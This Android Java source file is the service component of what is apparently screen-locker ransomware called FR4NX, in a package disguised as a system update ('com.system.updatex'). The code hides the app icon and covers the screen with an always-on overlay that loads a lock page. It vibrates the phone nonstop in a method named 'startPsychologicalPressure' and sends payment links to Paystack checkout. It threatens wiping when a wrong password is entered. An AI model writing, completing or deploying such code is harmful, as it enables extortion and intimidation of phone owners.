package com.system.updatex;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.Settings;
import android.view.Gravity;
import android.view.WindowManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class OverlayService extends Service {
    private static final String CHANNEL_ID = "fr4nx_kiosk";
    private static final int NOTIFICATION_ID = 9001;

    private WindowManager windowManager;
    private WindowManager.LayoutParams windowParams;
    private WebView lockWebView;
    private boolean overlayAttached = false;
    private Vibrator vibrator;

    @Override
    public void onCreate() {
        super.onCreate();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        
        // Hide icon immediately on boot
        IconUtils.hideIcon(this);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "FR4NX", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NotificationManager.class)).createNotificationChannel(channel);
            startForeground(NOTIFICATION_ID, new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("FR4NX")
                    .setSmallIcon(android.R.drawable.ic_lock_lock)
                    .build());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!Settings.canDrawOverlays(this)) {
            stopSelf();
            return START_NOT_STICKY;
        }
        
        boolean isUnlocked = getSharedPreferences("fr4nx_state", MODE_PRIVATE).getBoolean("is_unlocked", false);
        if (isUnlocked) {
            stopSelf();
            return START_NOT_STICKY;
        }

        if (!overlayAttached) {
            createOverlay();
            startPsychologicalPressure();
        }
        return START_STICKY;
    }

    private void createOverlay() {
        if (overlayAttached) return;
        
        windowParams = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                PixelFormat.TRANSLUCENT
        );
        windowParams.gravity = Gravity.TOP | Gravity.START;
        windowParams.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE;

        lockWebView = new WebView(this);
        WebSettings webSettings = lockWebView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setAllowUniversalAccessFromFileURLs(true);
        webSettings.setAllowFileAccessFromFileURLs(true);
        
        lockWebView.setBackgroundColor(0xFF050000);
        lockWebView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                // If the URL is a Paystack link, open it in the external browser
                if (url.contains("paystack.com") || url.contains("checkout.paystack")) {
                    Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                    browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(browserIntent);
                    return true; // Stop WebView from loading it internally
                }
                return false;
            }
        });
        
        lockWebView.addJavascriptInterface(new LockWebInterface(this), "Android");
        lockWebView.loadUrl("file:///android_asset/lock_screen.html");

        try {
            windowManager.addView(lockWebView, windowParams);
            overlayAttached = true;
        } catch (Exception e) {
            stopSelf();
        }
    }

    private void startPsychologicalPressure() {
        vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        if (vibrator != null && vibrator.hasVibrator()) {
            long[] pattern = {0, 1000, 1000};
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createWaveform(pattern, 0));
            } else {
                vibrator.vibrate(pattern, 0);
            }
        }
    }

    public void authenticateUser(String pass) {
        if ("FR4NX".equals(pass)) {
            lockWebView.post(() -> lockWebView.evaluateJavascript("showDecrypting();", null));
        } else {
            lockWebView.post(() -> lockWebView.evaluateJavascript("showWiping();", null));
        }
    }

    public void unlockOverlay() {
        if (vibrator != null) vibrator.cancel();
        
        // .commit() saves the flag SYNCHRONOUSLY so it doesn't loop on restart
        getSharedPreferences("fr4nx_state", MODE_PRIVATE).edit().putBoolean("is_unlocked", true).commit();

        if (overlayAttached && lockWebView != null) {
            try {
                windowManager.removeView(lockWebView);
                lockWebView.destroy();
            } catch (Exception ignored) {}
            overlayAttached = false;
        }
        stopForeground(true);
        stopSelf();
    }

    @Override
    public void onDestroy() {
        if (vibrator != null) vibrator.cancel();
        if (overlayAttached && lockWebView != null) {
            try { windowManager.removeView(lockWebView); } catch (Exception ignored) {}
        }
        stopForeground(true);
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
